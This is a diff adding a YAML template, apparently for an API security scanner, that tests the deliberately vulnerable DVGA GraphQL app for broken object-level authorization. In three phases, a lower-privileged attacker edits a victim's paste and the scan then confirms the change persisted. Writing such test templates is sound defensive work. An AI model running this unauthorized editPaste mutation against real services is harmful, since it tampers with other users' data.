@@ -1,0 +1,102 @@
+# API1:2023 Broken Object Level Authorization - DVGA editPaste Mutation (Verified)
+#
+# This template tests for BOLA vulnerabilities in DVGA's editPaste mutation using a three-phase
+# approach that verifies mutation persistence:
+#
+# Phase 1 (setup): Read paste ID 1 as victim to capture original state
+# Phase 2 (attack): Attacker attempts unauthorized editPaste mutation
+# Phase 3 (verify): Re-read paste ID 1 to confirm mutation persisted
+#
+# Success criteria: All three phases return 200 AND verify phase shows attacker's modified title
+
+id: api1-bola-edit-paste-mutation
+info:
+  name: "DVGA - BOLA via editPaste Mutation (Verified)"
+  category: "API1:2023 Broken Object Level Authorization"
+  severity: "CRITICAL"
+  author: "hadrian"
+  description: |
+    Tests for Broken Object Level Authorization (BOLA) in DVGA's editPaste mutation with verification.
+    The editPaste mutation does not properly check if the authenticated user is the owner of the paste,
+    allowing attackers to modify pastes owned by other users. This template uses a three-phase approach
+    to verify the mutation actually persisted: setup reads original state, attack performs unauthorized
+    modification, and verify confirms the change persisted.
+  tags: ["graphql", "dvga", "bola", "authorization", "idor", "mutation"]
+  requires_llm_triage: false
+  test_pattern: "mutation"
+
+endpoint_selector:
+  requires_auth: true
+
+role_selector:
+  attacker_permission_level: "lower"
+  victim_permission_level: "higher"
+
+graphql:
+  # Phase 1: Setup - victim reads their paste
+  - query: |
+      query GetPaste {
+        paste(id: 1) {
+          id
+          title
+          content
+          ownerId
+        }
+      }
+    auth: "victim"
+    store_response_fields:
+      original_title: "data.paste.title"
+    matchers:
+      - type: status
+        status: [200]
+
+  # Phase 2: Attack - attacker modifies victim's paste
+  - query: |
+      mutation EditPaste {
+        editPaste(id: 1, title: "ATTACKER_MODIFIED", content: "Unauthorized modification by attacker") {
+          paste {
+            id
+            title
+            content
+            ownerId
+          }
+        }
+      }
+    auth: "attacker"
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["ATTACKER_MODIFIED"]
+        part: body
+
+  # Phase 3: Verify - victim re-reads to confirm change persisted
+  - query: |
+      query VerifyPaste {
+        paste(id: 1) {
+          id
+          title
+          content
+          ownerId
+        }
+      }
+    auth: "victim"
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["ATTACKER_MODIFIED"]
+        part: body
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data.paste.title"
+      value: "ATTACKER_MODIFIED"
+  vulnerability_pattern: "dvga_bola_paste_mutation_verified"
+  conditions:
+    - attack_phase_status: [200]
+      verify_phase_status: [200]
+      verify_field_changed: true
